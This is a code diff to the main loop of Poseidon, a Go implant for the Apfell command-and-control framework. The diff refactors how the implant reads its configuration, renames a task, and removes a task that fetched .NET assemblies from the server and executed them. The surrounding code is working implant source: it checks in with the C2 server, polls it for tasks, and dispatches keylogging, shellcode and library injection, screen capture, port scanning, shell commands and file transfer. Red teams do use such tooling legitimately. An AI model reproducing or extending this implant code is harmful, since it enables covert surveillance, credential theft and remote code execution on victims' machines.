@@ -4,42 +4,40 @@ import (
 	"C"
 	"encoding/json"
 	"fmt"
+	"log"
 	"os"
 	"os/user"
 	"strconv"
 	"strings"
 	"time"
-	"log"
 
 	"github.com/xorrior/poseidon/pkg/commands/cat"
-	"github.com/xorrior/poseidon/pkg/commands/executeassembly"
+	"github.com/xorrior/poseidon/pkg/commands/cp"
+	"github.com/xorrior/poseidon/pkg/commands/drives"
+	"github.com/xorrior/poseidon/pkg/commands/getenv"
 	"github.com/xorrior/poseidon/pkg/commands/getprivs"
+	"github.com/xorrior/poseidon/pkg/commands/getuser"
+	"github.com/xorrior/poseidon/pkg/commands/keylog"
 	"github.com/xorrior/poseidon/pkg/commands/keys"
+	"github.com/xorrior/poseidon/pkg/commands/kill"
 	"github.com/xorrior/poseidon/pkg/commands/libinject"
 	"github.com/xorrior/poseidon/pkg/commands/ls"
+	"github.com/xorrior/poseidon/pkg/commands/mkdir"
+	"github.com/xorrior/poseidon/pkg/commands/mv"
 	"github.com/xorrior/poseidon/pkg/commands/portscan"
 	"github.com/xorrior/poseidon/pkg/commands/ps"
+	"github.com/xorrior/poseidon/pkg/commands/pwd"
+	"github.com/xorrior/poseidon/pkg/commands/rm"
 	"github.com/xorrior/poseidon/pkg/commands/screencapture"
+	"github.com/xorrior/poseidon/pkg/commands/setenv"
 	"github.com/xorrior/poseidon/pkg/commands/shell"
 	"github.com/xorrior/poseidon/pkg/commands/shinject"
 	"github.com/xorrior/poseidon/pkg/commands/sshauth"
 	"github.com/xorrior/poseidon/pkg/commands/triagedirectory"
-	"github.com/xorrior/poseidon/pkg/commands/cp"
-	"github.com/xorrior/poseidon/pkg/commands/drives"
-	"github.com/xorrior/poseidon/pkg/commands/getenv"
-	"github.com/xorrior/poseidon/pkg/commands/getuser"
-	"github.com/xorrior/poseidon/pkg/commands/keylog"
-	"github.com/xorrior/poseidon/pkg/commands/kill"
-	"github.com/xorrior/poseidon/pkg/commands/mkdir"
-	"github.com/xorrior/poseidon/pkg/commands/mv"
-	"github.com/xorrior/poseidon/pkg/commands/pwd"
-	"github.com/xorrior/poseidon/pkg/commands/rm"
-	"github.com/xorrior/poseidon/pkg/commands/setenv"
 	"github.com/xorrior/poseidon/pkg/commands/unsetenv"
 	"github.com/xorrior/poseidon/pkg/profiles"
 	"github.com/xorrior/poseidon/pkg/utils/functions"
 	"github.com/xorrior/poseidon/pkg/utils/structs"
-	
 )
 
 const (
@@ -67,13 +65,14 @@ func main() {
 	currPid := os.Getpid()
 	p := profiles.NewInstance()
 	profile := p.(profiles.Profile)
-	profile.SetUniqueID(profiles.UUID)
-	profile.SetURL(profiles.BaseURL)
-	profile.SetURLs(profiles.BaseURLs)
-	profile.SetSleepInterval(profiles.Sleep)
-	profile.SetUserAgent(profiles.UserAgent)
+	profile.SetUniqueID(profiles.PConfig.UUID)
+	profile.SetURL(profiles.PConfig.BaseURL)
+	profile.SetURLs(profiles.PConfig.BaseURLS)
+	sleep, _ := strconv.Atoi(profiles.PConfig.Sleep)
+	profile.SetSleepInterval(sleep)
+	profile.SetUserAgent(profiles.PConfig.UserAgent)
 	// Evaluate static variables
-	if strings.Contains(profiles.ExchangeKeyString, "T") {
+	if profiles.PConfig.KEYX {
 		//log.Println("Xchange keys true")
 		profile.SetXKeys(true)
 	} else {
@@ -81,24 +80,24 @@ func main() {
 		profile.SetXKeys(false)
 	}
 
-	if !strings.Contains(profiles.AesPSK, "AESPSK") && len(profiles.AesPSK) > 0 {
+	if !strings.Contains(profiles.PConfig.AESPSK, "AESPSK") && len(profiles.PConfig.AESPSK) > 0 {
 		//log.Println("Aes pre shared key is set")
-		profile.SetAesPreSharedKey(profiles.AesPSK)
+		profile.SetAesPreSharedKey(profiles.PConfig.AESPSK)
 	} else {
 		//log.Println("Aes pre shared key is not set")
 		profile.SetAesPreSharedKey("")
 	}
 
-	if len(profiles.HostHeader) > 0 {
-		profile.SetHeader(profiles.HostHeader)
+	if len(profiles.PConfig.HostHeader) > 0 {
+		profile.SetHeader(profiles.PConfig.HostHeader)
 	}
 
 	// Checkin with Apfell. If encryption is enabled, the keyx will occur during this process
 	// fmt.Println(currentUser.Name)
 	resp := profile.CheckIn(currIP, currPid, currentUser.Username, hostname)
-	checkIn := resp.(structs.CheckinResponse)
+	checkIn := resp.(structs.Msg)
 	//log.Printf("Received checkin response: %+v\n", checkIn)
-	profile.SetApfellID(checkIn.ID)
+	profile.SetApfellID(checkIn["id"].(string))
 
 	tasktypes := map[string]int{
 		"exit":             EXIT_CODE,
@@ -107,7 +106,7 @@ func main() {
 		"keylog":           3,
 		"download":         4,
 		"upload":           5,
-		"inject":           6,
+		"libinject":           6,
 		"shinject":         7,
 		"ps":               8,
 		"sleep":            9,
@@ -121,7 +120,6 @@ func main() {
 		"sshauth":          17,
 		"portscan":         18,
 		"getprivs":         19,
-		"execute-assembly": 20,
 		"jobs":             21,
 		"jobkill":          22,
 		"cp":               23,
@@ -141,7 +139,7 @@ func main() {
 	// Channel used to catch results from tasking threads
 	res := make(chan structs.ThreadMsg)
 	//if we have an Active apfell session, enter the tasking loop
-	if strings.Contains(checkIn.Status, "success") {
+	if strings.Contains(checkIn["status"].(string), "success") {
 	LOOP:
 		for {
 			time.Sleep(time.Duration(profile.SleepInterval()) * time.Second)
@@ -189,6 +187,7 @@ func main() {
 				break
 			case 5:
 				// File upload
+
 				fileDetails := structs.FileUploadParams{}
 				err := json.Unmarshal([]byte(task.Params), &fileDetails)
 				if err != nil {
@@ -295,44 +294,6 @@ func main() {
 			case 19:
 				// Enable privileges for your current process.
 				go getprivs.Run(task, res)
-				break
-			case 20:
-				// Execute a .NET assembly
-				tMsg := &structs.ThreadMsg{}
-				tMsg.TaskItem = task
-				args := &executeassembly.Arguments{}
-				// log.Println("Windows Inject:\n", string(task.Params))
-				err := json.Unmarshal([]byte(task.Params), &args)
-
-				if err != nil {
-					tMsg.Error = true
-					tMsg.TaskResult = []byte(err.Error())
-					res <- *tMsg
-					break
-				}
-
-				if assemblyFetched == 0 {
-					if args.LoaderFileID == "" {
-						tMsg.Error = true
-						tMsg.TaskResult = []byte("Have not fetched the .NET assembly yet. Please upload to the server and specify the file ID.")
-						res <- *tMsg
-						break
-					}
-					//log.Println("Fetching loader file...")
-					args.LoaderBytes = profile.GetFile(args.LoaderFileID)
-					if len(args.LoaderBytes) == 0 {
-						tMsg.Error = true
-						tMsg.TaskResult = []byte(fmt.Sprintf("Invalid .NET Loader DLL retrieved. Length of DLL retrieved: %d", len(args.LoaderBytes)))
-						res <- *tMsg
-						break
-					}
-					//log.Println("Done")
-					assemblyFetched += 1 // Increment the counter so we know not to fetch it again.
-				}
-				//log.Println("Fetching assembly bytes...")
-				args.AssemblyBytes = profile.GetFile(args.AssemblyFileID)
-				//log.Println("Done")
-				go executeassembly.Run(args, tMsg, res)
 				break
 			case 21:
 				// Return the list of jobs.
